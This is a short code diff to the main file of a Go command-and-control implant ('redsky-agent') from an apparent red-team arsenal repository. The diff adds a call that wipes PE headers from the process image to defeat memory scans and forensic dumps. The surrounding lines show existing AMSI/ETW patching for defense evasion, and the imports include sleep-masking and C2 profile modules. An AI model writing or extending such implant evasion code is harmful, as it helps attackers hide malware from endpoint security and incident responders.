@@ -27,6 +27,7 @@ import (
 	"sync"
 
 	"github.com/sk666G/red-sky---arsenal/internal/c2profile"
+	"github.com/sk666G/red-sky---arsenal/internal/evasion"
 	"github.com/sk666G/red-sky---arsenal/internal/sleepmask"
 	"time"
 
@@ -91,6 +92,17 @@ func main() {
 	}
 
 	log.Printf("redsky-agent starting id=%s target=%s:%d", agentID, *host, *port)
+
+	// Wipe PE headers from the mapped image. The process has already
+	// loaded; zeroing DOS/NT headers here means a runtime memory scan
+	// or forensic dump of this process sees no recognizable PE. Errors
+	// are logged and ignored — the wipe is defense-in-depth, not a
+	// hard requirement for the agent to function.
+	if err := evasion.WipePEHeaders(); err != nil {
+		log.Printf("pe wipe: %v", err)
+	} else {
+		log.Printf("pe headers wiped from mapped image")
+	}
 
 	// Defense evasion: patch AMSI/ETW on Windows. No-op on Linux/macOS.
 	for _, r := range evade.Init() {
